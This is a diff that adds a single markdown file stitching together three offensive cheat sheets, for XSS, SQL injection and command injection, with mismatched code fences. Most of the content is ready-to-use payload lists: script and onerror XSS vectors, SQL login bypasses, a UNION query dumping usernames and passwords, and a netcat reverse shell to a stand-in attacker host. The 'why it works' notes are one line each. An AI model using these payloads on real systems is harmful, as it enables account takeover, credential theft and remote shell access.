@@ -1,0 +1,76 @@
+# XSS Cheat Sheet
+
+## 🔥 Common Payloads
+```html
+<script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+
+
+🎯 Where to use XSS payloads:
+
+HTML attributes
+
+Text nodes
+
+JavaScript contexts
+
+Event handlers
+
+🧠 Why XSS works
+
+App fails to escape HTML characters → browser treats payload as code.
+
+🩸 Impact
+
+Account takeover (cookie theft)
+
+Session riding
+
+DOM manipulation
+
+Keylogging
+
+
+---
+
+# 📘 **cheatsheets/sqli-cheatsheet.md**
+```markdown
+# SQL Injection Cheat Sheet
+
+## 🔥 Login Bypass
+' OR 1=1 --
+" OR ""="
+admin'--
+
+## 🔥 UNION Injection
+UNION SELECT 1,2,3--
+UNION SELECT username, password, 3 FROM users--
+
+## 🔥 Boolean-based
+' OR '1'='1
+' AND 1=2 --
+
+## 🧠 Why SQLi works
+Server concatenates untrusted input directly into SQL queries.
+
+## 🩸 Impact
+- Dump database
+- Modify/delete data
+- Full compromise
+
+📘 cheatsheets/command-injection-cheatsheet.md
+# Command Injection Cheat Sheet
+
+## Payloads
+; id
+&& whoami
+| nc attacker.com 4444 -e /bin/bash
+
+## Why it works
+User input is executed by OS without sanitization.
+
+## Impact
+- Reverse shells
+- Privilege escalation
+- Full takeover
